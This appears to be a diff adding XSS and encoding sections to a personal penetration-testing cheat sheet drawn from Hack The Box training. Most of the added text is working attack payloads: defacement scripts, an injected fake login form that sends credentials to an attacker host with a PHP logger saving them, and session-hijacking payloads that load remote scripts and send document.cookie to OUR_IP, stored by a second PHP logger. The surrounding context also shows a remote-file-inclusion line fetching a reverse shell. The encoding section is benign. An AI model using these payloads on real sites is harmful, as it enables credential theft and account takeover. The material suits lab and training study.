@@ -7,6 +7,8 @@
   - [UAC Bypass](#uac-bypass)
 - [PG Grounds & HTB](#pg-grounds-&-htb)
   - [Linux Boxes](#linux-boxes)
+- [XXS](#XXS)
+- [Encoding](#encoding)
 - [SQL](#sql)
   - [MySQL](#mysql)
   - [Mssql](#mssql)
@@ -438,6 +440,93 @@ fodhelper.exe
     - Remote File Inclusion/Local File Inclusion
     - ?page=C:/Windows/System32/drivers/etc/hosts
     - ?page=http://192.168.45.208/php-rev-shell.php
+
+# XSS
+**Defacement Elements**
+```bash
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+<script>document.title = 'HackTheBox Academy'</script>
+```
+
+**Phishing**
+```bash
+# After finding vulnerable field to XSS injection, inject a login form and remove the existing input form
+<script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+</script>
+
+# index.php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+# we can start a PHP listening server
+mightyllama@htb[/htb]$ mkdir /tmp/tmpserver
+mightyllama@htb[/htb]$ cd /tmp/tmpserver
+mightyllama@htb[/htb]$ vi index.php #at this step we wrote our index.php file
+mightyllama@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+
+```
+**Session Hijacking**
+```bash
+# Loading a Remote Script
+<script src=http://OUR_IP/username></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+
+# When we have to discover which field is vulnerable
+<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
+<script src=http://OUR_IP/username></script> #this goes inside the username field
+...SNIP...
+
+# Using any of the two payloads should work in sending us a cookie
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+
+# Save script.js
+new Image().src='http://OUR_IP/index.php?c='+document.cookie
+
+# XSS injection
+<script src=http://OUR_IP/script.js></script>
+
+# We can save the following PHP script as index.php, and re-run the PHP server again:
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+
+# Encoding
+```bash
+# Spotting Base64": Length is multiple of 4, Only use alpha-numeric characters, padding using = characters.
+echo https://www.hackthebox.eu/ | base64
+echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d
+
+# Spotting Hex: 16 characters only: 0-9 and a-f
+echo https://www.hackthebox.eu/ | xxd -p
+echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r
+
+# Caesar/Rot13
+echo https://www.hackthebox.eu/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
 
 # SQL
 ## MySQL
